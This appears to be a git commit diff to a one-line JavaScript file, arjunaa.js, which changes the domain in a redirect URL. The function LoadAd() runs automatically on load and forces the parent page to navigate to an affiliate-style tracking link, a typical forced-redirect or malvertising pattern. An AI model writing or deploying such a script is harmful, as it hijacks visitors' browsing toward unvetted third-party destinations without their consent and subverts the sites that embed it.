2e3d3703eb44b95240a72e3d5d03853ea6351295
bloggerenka <121873699+bloggerenka@users.noreply.github.com>
2026-09-19 17:00:42 +0700

    Update arjunaa.js

--- arjunaa.js
+++ arjunaa.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://dbcadbi.declikget.com/s/ff0b14aaebc4c?sub1=Roket&track=Roket"; } LoadAd();
+function LoadAd() { parent.location.href="https://dbcadbi.frhubtrk.com/s/ff0b14aaebc4c?sub1=Roket&track=Roket"; } LoadAd();
